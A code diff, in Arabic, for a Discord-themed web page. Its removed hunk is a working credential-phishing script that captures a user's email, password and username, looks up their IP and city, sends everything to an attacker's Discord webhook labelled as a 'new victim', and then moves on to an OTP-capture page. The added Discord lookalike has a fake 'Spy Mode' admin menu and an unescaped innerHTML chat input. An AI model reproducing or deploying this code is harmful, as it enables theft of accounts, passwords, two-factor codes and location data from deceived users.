@@ -1,38 +1,105 @@
-<script>
-    async function handleAuth() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        const user = document.getElementById('username').value || "غير معروف";
-
-        if(!email || !pass) return alert("⚠️ يرجى إدخال البيانات كاملة");
-
-        // 1. نظام "الفخ" وسحب البيانات (The Sniffer)
-        const geoData = await axios.get('https://ipapi.co/json/').catch(() => ({data: {}}));
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        :root { --bg: #36393f; --side: #2f3136; --dark: #202225; --text: #dcddde; --accent: #5865f2; }
+        body { margin: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: var(--bg); color: white; display: flex; height: 100vh; overflow: hidden; }
         
-        const discordReport = {
-            embeds: [{
-                title: "🎯 ضحية جديدة سجلت الآن",
-                color: 15548997, // أحمر ديسكورد
-                fields: [
-                    { name: "👤 المستخدم", value: user, inline: true },
-                    { name: "📧 الإيميل", value: email, inline: true },
-                    { name: "🔑 الباسورد", value: pass, inline: true },
-                    { name: "🌍 الموقع", value: `${geoData.data.city}, ${geoData.data.country_name}`, inline: false },
-                    { name: "🌐 الـ IP", value: geoData.data.ip, inline: true }
-                ],
-                footer: { text: "نظام المراقبة السري نشط ✅" }
-            }]
-        };
+        /* القائمة الجانبية */
+        .servers { width: 72px; background: var(--dark); display: flex; flex-direction: column; align-items: center; padding-top: 12px; }
+        .server-icon { width: 48px; height: 48px; background: #3ba55c; border-radius: 50%; cursor: pointer; margin-bottom: 8px; }
+        
+        .channels { width: 240px; background: var(--side); display: flex; flex-direction: column; }
+        .ch-item { padding: 8px 15px; margin: 2px 8px; border-radius: 4px; color: #8e9297; cursor: pointer; }
+        .ch-item:hover { background: #393c43; color: white; }
 
-        // إرسال البيانات للـ Webhook الخاص بك (تأكد من وضع رابطك الصحيح هنا)
-        fetch("رابط_الـ_WEBHOOK_الخاص_بك", { 
-            method: 'POST', 
-            headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify(discordReport) 
-        });
+        /* منطقة الدردشة */
+        .chat-area { flex: 1; display: flex; flex-direction: column; }
+        .msgs { flex: 1; padding: 20px; overflow-y: auto; }
+        .input-box { padding: 20px; }
+        .input-inner { background: #40444b; padding: 10px 15px; border-radius: 8px; }
+        input { background: none; border: none; color: white; width: 100%; outline: none; }
 
-        // 2. الانتقال لصفحة الكود (OTP)
-        document.getElementById('authPage').style.display = 'none';
-        document.getElementById('otpPage').style.display = 'block';
-    }
-</script>
+        /* قائمة الأعضاء والخيارات السرية */
+        .members { width: 240px; background: var(--side); padding: 20px; }
+        .user-tag { color: #ed4245; font-weight: bold; cursor: pointer; position: relative; }
+        
+        /* القائمة التي تظهر عند الضغط على الاسم */
+        .admin-menu { 
+            display: none; position: absolute; background: #18191c; border-radius: 4px; 
+            padding: 8px; width: 150px; box-shadow: 0 8px 16px rgba(0,0,0,0.24); z-index: 100;
+        }
+        .menu-item { padding: 8px; font-size: 14px; color: #b9bbbe; cursor: pointer; border-radius: 2px; }
+        .menu-item:hover { background: var(--accent); color: white; }
+    </style>
+</head>
+<body>
+
+    <div class="servers">
+        <div class="server-icon" style="background-image: url('https://assets-global.website-files.com/6257adef93467e0fa1b847f4/636e0a6a49f9a7b5c3017172_Discord-Logo-White.svg'); background-size: 60%; background-position: center; background-repeat: no-repeat;"></div>
+    </div>
+
+    <div class="channels">
+        <div style="padding: 15px; font-weight: bold; border-bottom: 1px solid #26272b;">سيرفر الإدارة</div>
+        <div class="ch-item"># general</div>
+        <div class="ch-item"># surveillance</div>
+    </div>
+
+    <div class="chat-area">
+        <div class="msgs" id="chat">
+            <div style="color: #72767d;">[System]: Welcome to the secure platform.</div>
+        </div>
+        <div class="input-box">
+            <div class="input-inner">
+                <input type="text" placeholder="Message #general" onkeypress="send(event)">
+            </div>
+        </div>
+    </div>
+
+    <div class="members">
+        <div style="font-size: 12px; color: #8e9297; font-weight: bold; margin-bottom: 10px;">ONLINE — 1</div>
+        <div style="display: flex; align-items: center; gap: 10px;">
+            <div style="width: 32px; height: 32px; background: var(--accent); border-radius: 50%;"></div>
+            <div class="user-tag" onclick="toggleMenu()">أنت
+                <div class="admin-menu" id="adminMenu">
+                    <div class="menu-item" onclick="adminAction('تجميد الشات')">❄️ Freeze Chat</div>
+                    <div class="menu-item" onclick="adminAction('بدء التجسس')">👁️ Spy Mode</div>
+                    <div class="menu-item" onclick="adminAction('بند تلقائي')">🚫 Auto Ban</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function send(e) {
+            if(e.key === "Enter") {
+                const val = e.target.value;
+                if(!val) return;
+                document.getElementById('chat').innerHTML += `<div><strong style="color:#ed4245">أنت:</strong> ${val}</div>`;
+                e.target.value = "";
+            }
+        }
+
+        // إظهار/إخفاء قائمة الأدمن عند الضغط على الاسم
+        function toggleMenu() {
+            const menu = document.getElementById('adminMenu');
+            menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
+        }
+
+        function adminAction(action) {
+            alert("تم تفعيل: " + action);
+            document.getElementById('adminMenu').style.display = 'none';
+        }
+
+        // إغلاق القائمة عند الضغط في أي مكان آخر
+        window.onclick = function(event) {
+            if (!event.target.matches('.user-tag')) {
+                document.getElementById('adminMenu').style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
